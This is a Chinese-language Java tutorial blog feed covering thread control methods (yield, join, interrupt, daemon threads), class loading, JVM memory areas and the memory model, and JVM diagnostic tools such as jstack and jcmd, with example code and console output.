与sleep类似，也是Thread类提供的一个静态的方法，它也可以让当前正在执行的线程暂停，让出CPU资源给其他的线程。但是和sleep()方法不同的是，它不会进入到阻塞状态，而是进入到就绪状态。yield()方法只是让当前线程暂停一下，重新进入就绪线程池中，让系统的线程调度器重新调度器重新调度一次，完全可能出现这样的情况：当某个线程调用yield()方法之后，线程调度器又将其调度出来重新进入到运行状态执行。实际上，当某个线程调用了yield()方法暂停之后，优先级与当前线程相同，或者优先级比当前线程更高的就绪状态的线程更有可能获得执行的机会，当然，只是有可能，因为我们不可能精确的干涉cpu调度线程。
关于sleep()方法和yield()方的区别如下
sleep方法暂停当前线程后，会进入阻塞状态，只有当睡眠时间到了，才会转入就绪状态。而yield方法调用后 ，是直接进入就绪状态，所以有可能刚进入就绪状态，又被调度到运行状态；sleep方法声明抛出了InterruptedException，所以调用sleep方法的时候要捕获该异常，或者显示声明抛出该异常。而yield方法则没有声明抛出任务异常；sleep方法比yield方法有更好的可移植性，通常不要依靠yield方法来控制并发线程的执行；
6.4 join
线程的合并的含义就是 将几个并行线程的线程合并为一个单线程执行，应用场景是 当一个线程必须等待另一个线程执行完毕才能执行时，Thread类提供了join方法来完成这个功能，注意，它不是静态方法。
join有3个重载的方法：
void join()        当前线程等该加入该线程后面，等待该线程终止。    void join(long millis)        当前线程等待该线程终止的时间最长为 millis 毫秒。 如果在millis时间内，该线程没有执行完，那么当前线程进入就绪状态，重新等待cpu调度   void join(long millis,int nanos)        等待该线程终止的时间最长为 millis 毫秒 + nanos 纳秒。如果在millis时间内，该线程没有执行完，那么当前线程进入就绪状态，重新等待cpu调度
举例：
/** * 在主线程中调用thread.join(); 就是将主线程加入到thread子线程后面等待执行。不过有时间限制，为1毫秒。 */public class Test1 {    public static void main(String[] args) throws InterruptedException {        MyThread t = new MyThread();        t.start();        //将主线程加入到子线程后面，不过如果子线程在1毫秒时间内没执行完，则主线程便不再等待它执行完，进入就绪状态，等待cpu调度          t.join(1);        for (int i = 0; i &lt; 30; i++) {            System.out.println(Thread.currentThread().getName() + "线程第" + i + "次执行");        }    }}class MyThread extends Thread {    @Override    public void run() {        for (int i = 0; i &lt; 1000; i++) {            System.out.println(this.getName() + "线程，第" + i + "次执行");        }    }}
在JDK中join方法的源码，如下：
public final synchronized void join(long millis)  throws InterruptedException {      long base = System.currentTimeMillis();      long now = 0;        if (millis &lt; 0) {          throw new IllegalArgumentException("timeout value is negative");      }                if (millis == 0) {          while (isAlive()) {             wait(0);          }      } else {          while (isAlive()) {              long delay = millis - now;              if (delay &lt;= 0) {                  break;              }              wait(delay);              now = System.currentTimeMillis() - base;          }      }  }  
join方法实现是通过调用wait方法实现。当main线程调用t.join时候，main线程会获得线程对象t的锁（wait 意味着拿到该对象的锁)，调用该对象的wait(等待时间)，直到该对象唤醒main线程，比如退出后。这就意味着main 线程调用t.join时，必须能够拿到线程t对象的锁。
6.5 suspend &amp; resume (已过时)
suspend-线程进入阻塞状态，但不会释放锁。此方法已不推荐使用，因为同步时不会释放锁，会造成死锁的问题。
resume-使线程重新进入可执行状态。
为什么 Thread.suspend 和 Thread.resume 被废弃了？
Thread.suspend 天生容易引起死锁。如果目标线程挂起时在保护系统关键资源的监视器上持有锁，那么其他线程在目标线程恢复之前都无法访问这个资源。如果要恢复目标线程的线程在调用 resume 之前试图锁定这个监视器，死锁就发生了。这种死锁一般自身表现为“冻结（ frozen ）”进程。
其他相关资料：

https://blog.csdn.net/dlite/article/details/4212915

6.6 stop（已过时）
不推荐使用，且以后可能去除，因为它不安全。为什么 Thread.stop 被废弃了？
因为其天生是不安全的。停止一个线程会导致其解锁其上被锁定的所有监视器（监视器以在栈顶产生ThreadDeath异常的方式被解锁）。如果之前被这些监视器保护的任何对象处于不一致状态，其它线程看到的这些对象就会处于不一致状态。这种对象被称为受损的 （damaged）。当线程在受损的对象上进行操作时，会导致任意行为。这种行为可能微妙且难以检测，也可能会比较明显。
不像其他未受检的（unchecked）异常， ThreadDeath 悄无声息的杀死及其他线程。因此，用户得不到程序可能会崩溃的警告。崩溃会在真正破坏发生后的任意时刻显现，甚至在数小时或数天之后。
其他相关资料：

https://blog.csdn.net/dlite/article/details/4212915

6.7 wait &amp; notify/notifyAll
wait &amp; notify/notifyAll这三个都是Object类的方法。使用 wait ，notify 和 notifyAll 前提是先获得调用对象的锁。


调用 wait 方法后，释放持有的对象锁，线程状态有 Running 变为 Waiting，并将当前线程放置到对象的 等待队列；
调用notify 或者 notifyAll 方法后，等待线程依旧不会从 wait 返回，需要调用 noitfy 的线程释放锁之后，等待线程才有机会从 wait 返回；
notify 方法：将等待队列的一个等待线程从等待队列中移到同步队列中 ，而 notifyAll 方法：将等待队列中所有的线程全部移到同步队列，被移动的线程状态由 Waiting 变为 Blocked。


前面一直提到两个概念，等待队列（等待池），同步队列（锁池），这两者是不一样的。具体如下：

同步队列（锁池）：假设线程A已经拥有了某个对象（注意:不是类）的锁，而其它的线程想要调用这个对象的某个synchronized方法(或者synchronized块)，由于这些线程在进入对象的synchronized方法之前必须先获得该对象的锁的拥有权，但是该对象的锁目前正被线程A拥有，所以这些线程就进入了该对象的同步队列（锁池）中，这些线程状态为Blocked。
等待队列（等待池）：假设一个线程A调用了某个对象的wait()方法，线程A就会释放该对象的锁（因为wait()方法必须出现在synchronized中，这样自然在执行wait()方法之前线程A就已经拥有了该对象的锁），同时 线程A就进入到了该对象的等待队列（等待池）中，此时线程A状态为Waiting。如果另外的一个线程调用了相同对象的notifyAll()方法，那么 处于该对象的等待池中的线程就会全部进入该对象的同步队列（锁池）中，准备争夺锁的拥有权。如果另外的一个线程调用了相同对象的notify()方法，那么 仅仅有一个处于该对象的等待池中的线程（随机）会进入该对象的同步队列（锁池）。

6.8 线程优先级
每个线程执行时都有一个优先级的属性，优先级高的线程可以获得较多的执行机会，而优先级低的线程则获得较少的执行机会。与线程休眠类似，线程的优先级仍然无法保障线程的执行次序。只不过，优先级高的线程获取CPU资源的概率较大，优先级低的也并非没机会执行。

每个线程默认的优先级都与创建它的父线程具有相同的优先级，在默认情况下，main线程具有普通优先级；

Thread类提供了setPriority(int newPriority)和getPriority()方法来设置和返回一个指定线程的优先级，其中setPriority方法的参数是一个整数，范围是1~10之间，也可以使用Thread类提供的三个静态常量：
MAX_PRIORITY   =10MIN_PRIORITY   =1NORM_PRIORITY   =5
注意一点：

虽然Java提供了10个优先级别，但这些优先级别需要操作系统的支持。不同的操作系统的优先级并不相同，而且也不能很好的和Java的10个优先级别对应。所以我们应该使用MAX_PRIORITY、MIN_PRIORITY和NORM_PRIORITY三个静态常量来设定优先级，这样才能保证程序最好的可移植性。

6.9 守护线程
守护线程与普通线程写法上基本没啥区别，调用线程对象的方法setDaemon(true)，则可以将其设置为守护线程。
守护线程使用的情况较少，但并非无用，举例来说，JVM的垃圾回收、内存管理等线程都是守护线程。还有就是在做数据库应用时候，使用的数据库连接池，连接池本身也包含着很多后台线程，监控连接个数、超时时间、状态等等。
setDaemon方法详细说明：

public final void setDaemon(boolean on)：将该线程标记为守护线程或用户线程。当正在运行的线程都是守护线程时，Java 虚拟机退出。
该方法必须在启动线程前调用。 该方法首先调用该线程的 checkAccess 方法，且不带任何参数。这可能抛出 SecurityException（在当前线程中）。
参数：
on - 如果为 true，则将该线程标记为守护线程。
抛出：
IllegalThreadStateException - 如果该线程处于活动状态。SecurityException - 如果当前线程无法修改该线程。

/** * Java线程：线程的调度-守护线程 */  public class Test {          public static void main(String[] args) {                  Thread t1 = new MyCommon();                  Thread t2 = new Thread(new MyDaemon());                  t2.setDaemon(true);        //设置为守护线程                    t2.start();                  t1.start();          }  }    class MyCommon extends Thread {          public void run() {                  for (int i = 0; i &lt; 5; i++) {                          System.out.println("线程1第" + i + "次执行！");                          try {                                  Thread.sleep(7);                          } catch (InterruptedException e) {                                  e.printStackTrace();                          }                  }          }  }    class MyDaemon implements Runnable {          public void run() {                  for (long i = 0; i &lt; 9999999L; i++) {                          System.out.println("后台线程第" + i + "次执行！");                          try {                                  Thread.sleep(7);                          } catch (InterruptedException e) {                                  e.printStackTrace();                          }                  }          }  }  
执行结果：
后台线程第0次执行！  线程1第0次执行！  线程1第1次执行！  后台线程第1次执行！  后台线程第2次执行！  线程1第2次执行！  线程1第3次执行！  后台线程第3次执行！  线程1第4次执行！  后台线程第4次执行！  后台线程第5次执行！  后台线程第6次执行！  后台线程第7次执行！ 复制代码
从上面的执行结果可以看出：前台线程是保证执行完毕的，后台线程还没有执行完毕就退出了。

实际上：JRE判断程序是否执行结束的标准是所有的前台执线程行完毕了，而不管后台线程的状态，因此，在使用后台线程时候一定要注意这个问题。

6.10 如何结束一个线程
Thread.stop()、Thread.suspend、Thread.resume、Runtime.runFinalizersOnExit 这些终止线程运行的方法已经被废弃了，使用它们是极端不安全的！想要安全有效的结束一个线程，可以使用下面的方法。


正常执行完run方法，然后结束掉；
控制循环条件和判断条件的标识符来结束掉线程；


比如run方法这样写：只要保证在一定的情况下，run方法能够执行完毕即可。而不是while(true)的无限循环。
class MyThread extends Thread {      int i=0;      @Override      public void run() {          while (true) {              if(i==10)                  break;              i++;              System.out.println(i);                        }      }  }  或者class MyThread extends Thread {      int i=0;      boolean next=true;      @Override      public void run() {          while (next) {              if(i==10)                  next=false;              i++;              System.out.println(i);          }      }  }  或者class MyThread extends Thread {      int i=0;      @Override      public void run() {          while (true) {              if(i==10)                  return;              i++;              System.out.println(i);          }      }  }  复制代码
诚然，使用上面方法的标识符来结束一个线程，是一个不错的方法，但其也有弊端，如果 该线程是处于sleep、wait、join的状态时候，while循环就不会执行，那么我们的标识符就无用武之地了，当然也不能再通过它来结束处于这3种状态的线程了。
所以，此时可以使用interrupt这个巧妙的方式结束掉这个线程。我们先来看看sleep、wait、join方法的声明：
public final void wait() throws InterruptedException public static native void sleep(long millis) throws InterruptedExceptionpublic final void join() throws InterruptedException复制代码
可以看到，这三者有一个共同点，都抛出了一个InterruptedException的异常。在什么时候会产生这样一个异常呢？

每个Thread都有一个中断状状态，默认为false。可以通过Thread对象的isInterrupted()方法来判断该线程的中断状态。可以通过Thread对象的interrupt()方法将中断状态设置为true。
当一个线程处于sleep、wait、join这三种状态之一的时候，如果此时他的中断状态为true，那么它就会抛出一个InterruptedException的异常，并将中断状态重新设置为false。

看下面的简单的例子：
public class Test1 {      public static void main(String[] args) throws InterruptedException {          MyThread thread=new MyThread();          thread.start();      }  }    class MyThread extends Thread {      int i=1;      @Override      public void run() {          while (true) {              System.out.println(i);              System.out.println(this.isInterrupted());              try {                  System.out.println("我马上去sleep了");                  Thread.sleep(2000);                  this.interrupt();              } catch (InterruptedException e) {                  System.out.println("异常捕获了"+this.isInterrupted());                  return;              }              i++;          }      }  }  
测试结果：
1  false  我马上去sleep了  2  true  我马上去sleep了  异常捕获了false 
可以看到，首先执行第一次while循环，在第一次循环中，睡眠2秒，然后将中断状态设置为true。当进入到第二次循环的时候，中断状态就是第一次设置的true，当它再次进入sleep的时候，马上就抛出了InterruptedException异常，然后被我们捕获了。然后中断状态又被重新自动设置为false了（从最后一条输出可以看出来）。
所以，我们可以使用interrupt方法结束一个线程。具体使用如下：
public class Test1 {      public static void main(String[] args) throws InterruptedException {          MyThread thread=new MyThread();          thread.start();          Thread.sleep(3000);          thread.interrupt();      }  }    class MyThread extends Thread {      int i=0;      @Override      public void run() {          while (true) {              System.out.println(i);              try {                  Thread.sleep(1000);              } catch (InterruptedException e) {                  System.out.println("中断异常被捕获了");                  return;              }              i++;          }      }  } 
多测试几次，会发现一般有两种执行结果：
0  1  2  中断异常被捕获了
或者
0  1  2  3  中断异常被捕获了 
这两种结果恰恰说明了，只要一个线程的中断状态一旦为true，只要它进入sleep等状态，或者处于sleep状态，立马回抛出InterruptedException异常。

第一种情况，是当主线程从3秒睡眠状态醒来之后，调用了子线程的interrupt方法，此时子线程正处于sleep状态，立马抛出InterruptedException异常。
第二种情况，是当主线程从3秒睡眠状态醒来之后，调用了子线程的interrupt方法，此时子线程还没有处于sleep状态。然后再第3次while循环的时候，在此进入sleep状态，立马抛出InterruptedException异常。


JVM Class Loader
结束一个JVM的生命周期


System.exit：Runtime.getRuntime().exit(status)


正常执行结束


程序抛出异常


JVM Crash（异常）


操作系统/硬件异常


类加载的三个过程
查看class文件的二进制代码javap -v BasicThread
cd target/classes/com/hots/part1/chapter1javap -v BasicThread



加载（Loading）: 查找并且加载类的二进制数据


链接（Linking）

验证：确保被加载类的准确性
准备：为类的静态变量分配内存，并将其初始化为默认值
解析：把类中的符号引用转换为直接引用



初始化（Initialize）：为类的静态变量赋予正确的初始值


Java程序对类的使用方式：主动使用和被动使用
除了下述六个外，其余的都是被动使用，不会导致类的初始化。


new 直接使用


初始化一个子类，其父类也会被初始化


访问某个类或者接口的静态变量，或者对该静态变量进行赋值

对类的静态变量进行读写
对接口的静态变量进行读取（默认 final static）



调用静态方法


反射某个类


启动类。比如 java HelloWorld


特例说明几个非主动引用：


通过子类访问父类的static变量，不会导致子类的初始化（主动引用的是父类）
System.out.println(Child.salary);


定义引用数组，不会初始化类
Obj[] arrays = new Obj[10];


final修饰的==常量==会在编译期间放到常量池中，不会初始化类


final修饰的==复杂类型==，在编译期间无法计算得出，会初始化类
import java.util.Random;public class ClassActiveUse {    static {        System.out.println("ClassActiveUse");    }    public static void main(String[] args) throws ClassNotFoundException {        // final修饰的常量会在编译期间放到常量池中，不会初始化类        System.out.println(Obj.salary);        System.out.println("--------------------------------------");        // final修饰的复杂类型，在编译期间无法计算得出，会初始化类        System.out.println(Obj.x);    }}class Obj {    public static final long salary = 100000L;    public static final int x = new Random().nextInt(100);    static {        System.out.println("Obj 被初始化.");    }}
输出
ClassActiveUse100000--------------------------------------Obj 被初始化.27


加载（Loading）
加载的定义
将class文件中的二进制数据读取到内存中，将其放在方法区中，然后在堆中创建一个java.lang.Class对象，用来封装方法区的数据结构。
加载类的方式


本地磁盘中直接加载


内存中直接加载


通过网络加载class


从zip、jar等归档文件中加载.class文件


数据库中提取.class文件


动态编译


Class和Object对象在内存中

创建一个对象的过程

或者

链接（Linking）
初始化（Initialize）


类加载过程中的最后一步


初始化阶段是执行构造函数&lt;cinit&gt;方法的过程


&lt;cinit&gt;方法是由编译器自动收集类中的所有变量的赋值动作和静态语句块中的语句合并产生的


静态语句块中只能访问到定义在静态语句块之前的变量，定义在他之后的变量，只能赋值，不能访问。


&lt;cinit&gt;方法与类的构造函数的区别：他不需要显式的调用父类的构造函数，虚拟机会保证在子类的&lt;cinit&gt;执行之前，先执行父类的&lt;cinit&gt;，因此，在虚拟机中首先被执行的是Object的&lt;cinit&gt;方法


由于父类的&lt;cinit&gt;方法先被执行，也就意味着父类中定义的静态语句块，要优于子类


&lt;cinit&gt;方法对于一个类来说并不是必须的


接口中照样存在&lt;cinit&gt;方法


虚拟机有义务保证&lt;cinit&gt;方法的线程安全


JVM类加载器
父委托机制

类加载器的委托是优先交给父亲加载器先去尝试加载
父加载器和子加载器其实是一种包装关系，或者包含关系


public class BootClassLoader {    public static void main(String[] args) throws ClassNotFoundException {        // 根（Bootstrap）类加载器加载的内容        System.out.println(System.getProperty("sun.boot.class.path"));        System.out.println("------------------");        // 扩展（Extension）类加载器加载的内容        System.out.println(System.getProperty("java.ext.dirs"));        System.out.println("------------------");        Class&lt;?&gt; klass = Class.forName("example.chapter2.SimpleObject");        // 系统(Application)类加载器        // sun.misc.Launcher$AppClassLoader@18b4aac2        System.out.println(klass.getClassLoader());        // 扩展类加载器        // sun.misc.Launcher$ExtClassLoader@6d6f6e28        System.out.println(klass.getClassLoader().getParent());        // 根加载器是由C++写的，输出为null。        System.out.println(klass.getClassLoader().getParent().getParent());        // 无法获取到自定义的String类        // 原因：父加载器中存在，优先返回父加载器        Class&lt;?&gt; clazz = Class.forName("java.lang.String");        System.out.println(clazz);        System.out.println(clazz.getClassLoader());    }}
类加载器的命名空间


每个类的加载器都有子命名空间。命名空间由该加载器和其所有父加载器的类组成


在同一个命名空间中，不会出现完整的名字



运行时包


父类加载器看不到子类加载器加载的类


不同命名空间下的类加载器之间的类互相不可访问
可以理解为：运行时，类的实际包名 = 类加载器名称 + 包名//Boot.Ext.App.com.wangwenjun.concurrent.classloader.chapter5.SimpleClassLoaderTest//Boot.Ext.App.SimpleClassLoader.com.wangwenjun.concurrent.classloader.chapter5.SimpleClassLoaderTest


类的卸载以及ClassLoader的卸载（GC）
JVM中的Class只有满足以下三个条件，才能被GC回收，也就是该Class被卸载（unload）

该类所有的实例都已经被GC
加载该类的ClassLoader实例被GC
该类的java.lang.Class对象没有在任何地方被引用

GC的时机我们是不可控的，那么同样的我们对于Class的卸载也是不可控的
线程上下文类加载器
举例
Class.forName("com.mysql.jdbc.Driver")
JVM内存结构
    
JVM的内存结构大概分为：

堆（Heap）：线程共享。所有的==对象实例==以及==数组==都要在堆上分配。回收器主要管理的对象。
方法区（Method Area）：线程共享。存储类信息、常量、静态变量、即时编译器编译后的代码。（非堆）
虚拟机栈（JVM Stack）：线程私有。存储局部变量表、操作栈、动态链接、方法出口，对象指针。
本地方法栈（Native Method Stack）：线程私有。为虚拟机使用到的Native 方法服务。如Java使用c或者c++编写的接口服务时，代码在此区运行。
程序计数器（Program Counter Register）：线程私有。有些文章也翻译成PC寄存器（PC Register）。可看作是当前线程所执行的字节码的行号指示器。指向下一条要执行的指令。

先看一张图，这张图能很清晰的说明JVM内存结构的布局和相应的控制参数：
 
堆
堆的作用是存放对象实例和数组。从结构上来分，可以分为新生代和老年代。而新生代又可以分为Eden 空间、From Survivor 空间（s0）、To Survivor 空间（s1）。
所有新生成的对象首先都是放在新生代的。
需要注意，Survivor的两个区是对称的，没先后关系，所以同一个区中可能同时存在从Eden复制过来的对象，和从前一个Survivor复制过来的对象，而复制到老年代的只有从第一个Survivor区过来的对象。而且，Survivor区总有一个是空的。

控制参数

-Xms设置堆的最小空间大小。-Xmx设置堆的最大空间大小。
-XX:NewSize设置新生代最小空间大小。-XX:MaxNewSize设置新生代最大空间大小。

垃圾回收

此区域是垃圾回收的主要操作区域。

异常情况

如果在堆中没有内存完成实例分配，并且堆也无法再扩展时，将会抛出OutOfMemoryError 异常
方法区
方法区（Method Area）与Java 堆一样，是各个线程共享的内存区域，它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。
虽然Java 虚拟机规范把方法区描述为堆的一个逻辑部分，但是它却有一个别名叫做Non-Heap（非堆），目的应该是与Java 堆区分开来。
很多人愿意把方法区称为“永久代”（Permanent Generation），本质上两者并不等价，仅仅是因为HotSpot虚拟机的设计团队选择把GC 分代收集扩展至方法区，或者说使用永久代来实现方法区而已。对于其他虚拟机（如BEA JRockit、IBM J9 等）来说是不存在永久代的概念的。在Java8中永生代彻底消失了。

控制参数

-XX:PermSize 设置最小空间 -XX:MaxPermSize 设置最大空间。

垃圾回收

对此区域会涉及但是很少进行垃圾回收。这个区域的内存回收目标主要是针对常量池的回收和对类型的卸载，一般来说这个区域的回收“成绩”比较难以令人满意。

异常情况

根据Java 虚拟机规范的规定， 当方法区无法满足内存分配需求时，将抛出OutOfMemoryError。
方法栈（虚拟机栈）
每个线程会有一个私有的栈。每个线程中方法的调用又会在本栈中创建一个栈帧。在方法栈中会存放编译期可知的各种基本数据类型（boolean、byte、char、short、int、float、long、double）、对象引用（reference 类型，它不等同于对象本身。局部变量表所需的内存空间在编译期间完成分配，当进入一个方法时，这个方法需要在帧中分配多大的局部变量空间是完全确定的，在方法运行期间不会改变局部变量表的大小。

控制参数

-Xss控制每个线程栈的大小。

异常情况

在Java 虚拟机规范中，对这个区域规定了两种异常状况：
- StackOverflowError： 异常线程请求的栈深度大于虚拟机所允许的深度时抛出；
- OutOfMemoryError 异常： 虚拟机栈可以动态扩展，当扩展时无法申请到足够的内存时会抛出。
本地方法栈
本地方法栈（Native Method Stacks）与虚拟机栈所发挥的作用是非常相似的，其区别不过是虚拟机栈为虚拟机执行Java 方法（也就是字节码）服务，而本地方法栈则
是为虚拟机使用到的Native 方法服务。

控制参数

在Sun JDK中本地方法栈和方法栈是同一个，因此也可以用-Xss控制每个线程的大小。

异常情况

与虚拟机栈一样，本地方法栈区域也会抛出StackOverflowError 和OutOfMemoryError异常。
程序计数器
它的作用可以看做是当前线程所执行的字节码的行号指示器。


异常情况：
此内存区域是唯一一个在Java 虚拟机规范中没有规定任何OutOfMemoryError 情况的区域。



常见内存溢出错误说明
有了对内存结构清晰的认识，就可以帮助我们理解不同的OutOfMemoryErrors，下面列举一些比较常见的内存溢出错误，通过查看冒号“：”后面的提示信息，基本上就能断定是JVM运行时数据的哪个区域出现了问题。
Exception in thread “main”: java.lang.OutOfMemoryError: Java heap space原因：对象不能被分配到堆内存中。
Exception in thread “main”: java.lang.OutOfMemoryError: PermGen space原因：类或者方法不能被加载到老年代。它可能出现在一个程序加载很多类的时候，比如引用了很多第三方的库。
Exception in thread “main”: java.lang.OutOfMemoryError: Requested array size exceeds VM limit原因：创建的数组大于堆内存的空间。
Exception in thread “main”: java.lang.OutOfMemoryError: request &lt;size&gt; bytes for &lt;reason&gt;. Out of swap space?原因：方法内存分配失败。JNI、本地库或者Java虚拟机都会从本地堆中分配内存空间。
Exception in thread “main”: java.lang.OutOfMemoryError: &lt;reason&gt; &lt;stack trace&gt;（Native method）原因：同样是本地方法内存分配失败，只不过是JNI或者本地方法或者Java虚拟机发现。
关于OutOfMemoryError的更多信息可以查看：
Troubleshooting Memory Leaksdocs.oracle.com/javase/7/docs/webnotes/tsg/TSG-VM/html/memleaks.html
Java内存模型
​		由上述对JVM内存结构的描述中，我们知道了堆和方法区是线程共享的。而局部变量，方法定义参数和异常处理器参数就不会在线程之间共享，它们不会有内存可见性问题，也不受内存模型的影响。
Java线程之间的通信由Java内存模型（本文简称为JMM）控制
​		JMM决定一个线程对共享变量的写入何时对另一个线程可见。
​		从抽象的角度来看，JMM定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（main memory）中，每个线程都有一个私有的本地内存（local memory），本地内存中存储了该线程以读/写共享变量的副本。
​		本地内存是JMM的一个抽象概念，并不真实存在。它涵盖了缓存，写缓冲区，寄存器以及其他的硬件和编译器优化。
​		Java内存模型的抽象示意图如下：

从上图来看，线程A与线程B之间如要通信的话，必须要经历下面2个步骤：

首先，线程A把本地内存A中更新过的共享变量刷新到主内存中去。
通知本地内存共享变量的副本失效，再次读取时需要强制从主内存读取。
然后，线程B到主内存中去读取线程A之前已更新过的共享变量。

下面通过示意图来说明这两个步骤：

如上图所示，本地内存A和B有主内存中共享变量x的副本。假设初始时，这三个内存中的x值都为0。线程A在执行时，把更新后的x值（假设值为1）临时存放在自己的本地内存A中。当线程A和线程B需要通信时，线程A首先会把自己本地内存中修改后的x值刷新到主内存中，此时主内存中的x值变为了1。随后，线程B到主内存中去读取线程A更新后的x值，此时线程B的本地内存的x值也变为了1。
从整体来看，这两个步骤实质上是线程A在向线程B发送消息，而且这个通信过程必须要经过主内存。JMM通过控制主内存与每个线程的本地内存之间的交互，来为java程序员提供内存可见性保证。
指令重排序
在执行程序时为了提高性能，编译器和处理器常常会对指令做重排序。
这里说的重排序可以发生在好几个地方：编译器、运行时、JIT等，比如编译器会觉得把一个变量的写操作放在最后会更有效率，编译后，这个指令就在最后了（前提是只要不改变程序的语义，编译器、执行器就可以这样自由的随意优化），一旦编译器对某个变量的写操作进行优化（放到最后），那么在执行之前，另一个线程将不会看到这个执行结果。
当然了，写入动作可能被移到后面，那也有可能被挪到了前面，这样的“优化”有什么影响呢？这种情况下，其它线程可能会在程序实现“发生”之前，看到这个写入动作（这里怎么理解，指令已经执行了，但是在代码层面还没执行到）。通过内存屏障的功能，我们可以禁止一些不必要、或者会带来负面影响的重排序优化，在内存模型的范围内，实现更高的性能，同时保证程序的正确性。
下面我们来看一个重排序的例子：
Class Reordering {  int x = 0, y = 0;  public void writer() {    x = 1;    y = 2;  }  public void reader() {    int r1 = y;    int r2 = x;  }}
假设这段代码有2个线程并发执行，线程A执行writer方法，线程B执行reader方法，线程B看到y的值为2，因为把y设置成2发生在变量x的写入之后（代码层面），所以能断定线程B这时看到的x就是1吗？
当然不行！ 因为在writer方法中，可能发生了重排序，y的写入动作可能发在x写入之前，这种情况下，线程B就有可能看到x的值还是0。
在Java内存模型中，描述了在多线程代码中，哪些行为是正确的、合法的，以及多线程之间如何进行通信，代码中变量的读写行为如何反应到内存、CPU缓存的底层细节。
在Java中包含了几个关键字：volatile、final和synchronized，帮助程序员把代码中的并发需求描述给编译器。JMM中定义了它们的行为，确保正确同步的Java代码在所有的处理器架构上都能正确执行。
]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM性能调优工具</title>
    <url>/20221027/cc1c3bcb.html</url>
    <content><![CDATA[jstack：Java堆栈跟踪工具
jstack（Stack Trace for Java）命令用于生成虚拟机当前时刻的线程快照（一般称为threaddump或者javacore文件）。
线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合，生成线程快照的主要目的是定位线程出现长时间停顿的原因，如线程间死锁、死循环、请求外部资源导致的长时间等待等，都是导致线程长时间停顿的常见原因。线程出现停顿的时候通过jstack来查看各个线程的调用堆栈，就可以知道没有响应的线程到底在后台做些什么事情，或者等待着什么资源。
命令格式
jstack [option]  LVMID



参数
说明




-l
long listings，会打印出额外的锁信息，在发生死锁时可以用jstack -l pid来观察锁持有情况


-m
mixed mode，不仅会输出Java堆栈信息，如果调用到本地方法的话，可以显示C/C++的堆栈


-F
当正常输出请求不被响应时，强制输出线程堆栈



在JDK 1.5中，java.lang.Thread类新增了一个getAllStackTraces（）方法用于获取虚拟机中所有线程的StackTraceElement对象。
使用这个方法可以通过简单的几行代码就完成jstack的大部分功能，在实际项目中不妨调用这个方法做个管理员页面，可以随时使用浏览器来查看线程堆栈。
＜%@page import="java.util.Map"%＞＜html＞＜head＞＜title＞服务器线程信息＜/title＞＜/head＞＜body＞＜pre＞＜%for（Map.Entry＜Thread,StackTraceElement[]＞stackTrace：Thread.getAllStackTraces（）.entrySet（））{　　Thread thread=（Thread）stackTrace.getKey（）；　　StackTraceElement[]stack=（StackTraceElement[]）stackTrace.getValue（）；　　if（thread.equals（Thread.currentThread（）））{　　　　continue；　　}　　out.print（"\n线程："+ thread.getName（）+"\n"）；　　for（StackTraceElement element：stack）{　　　　out.print（"\t"+element+"\n"）；　　}}%＞＜/pre＞＜/body＞＜/html＞


jps 查看进程ID
  C:\Users\Administrator&gt;jps10904 Jps351211228 Launcher12220 Bank


jstack 打印堆栈信息
  C:\Users\Administrator&gt;jstack -l 122202021-12-26 22:09:55Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.131-b11 mixed mode):"DestroyJavaVM" #16 prio=5 os_prio=0 tid=0x00000000029e2800 nid=0xf8 waiting on condition [0x0000000000000000]   java.lang.Thread.State: RUNNABLE   Locked ownable synchronizers:        - None"四号" #15 prio=5 os_prio=0 tid=0x000000001e5c8000 nid=0x3524 waiting for monitor entry [0x000000001f63f000]   java.lang.Thread.State: BLOCKED (on object monitor)        at com.hots.chapter7.TickWindowRunnable.run(Bank.java:27)        - waiting to lock &lt;0x000000076b62bf28&gt; (a java.lang.Object)        at java.lang.Thread.run(Thread.java:748)   Locked ownable synchronizers:        - None"三号" #14 prio=5 os_prio=0 tid=0x000000001e5c7800 nid=0x18b4 waiting for monitor entry [0x000000001f53f000]   java.lang.Thread.State: BLOCKED (on object monitor)        at com.hots.chapter7.TickWindowRunnable.run(Bank.java:27)        - waiting to lock &lt;0x000000076b62bf28&gt; (a java.lang.Object)        at java.lang.Thread.run(Thread.java:748)...


jstack 打印堆栈信息到文件
  C:\Users\Administrator&gt;jstack -l 12220 &gt;&gt; test.txt# 打印结果保存到目录：C:\Users\Administrator下


jcmd：虚拟机工具
jcmd -l：列出当前运行的所有虚拟机



参数
说明




-l
参数-l表示列出所有java虚拟机



jcmd [pid] help：列出该虚拟机支持的所有命令
针对每一个虚拟机，可以使用help命令列出该虚拟机支持的所有命令
PS C:\Users\Administrator&gt; jcmd 13204 help13204:The following commands are available:JFR.stopJFR.startJFR.dumpJFR.checkVM.native_memoryVM.check_commercial_featuresVM.unlock_commercial_featuresManagementAgent.stopManagementAgent.start_localManagementAgent.startGC.rotate_logThread.printGC.class_statsGC.class_histogramGC.heap_dumpGC.run_finalizationGC.runVM.uptimeVM.flagsVM.system_propertiesVM.command_lineVM.versionhelp
其中具体举例
jcmd  [pid]  VM.uptime： 查看虚拟机启动时间
PS C:\Users\Administrator&gt; jcmd 13204 VM.uptime13204:142.109 s
jcmd [pid] Thread.print：打印线程栈信息
（该命令同 jstack 命令）

jcmd [pid]  GC.class_histogram：查看系统中类统计信息
这里和jmap -histo pid的效果是一样的 。这个可以查看每个类的实例数量和占用空间大小。

jcmd [pid] GC.heap_dump [filepath&amp;name]
跟 jmap命令：jmap -dump:format=b,file=heapdump.phrof pid 效果一样。
导出的 dump 文件，可以使用MAT 或者 Visual VM 等工具进行分析。
PS C:\Users\Administrator&gt; jcmd 13204 GC.heap_dump D:\test.hprof13204:Heap dump file created
jcmd [pid] VM.system_properties： 查看 JVM 的属性信息
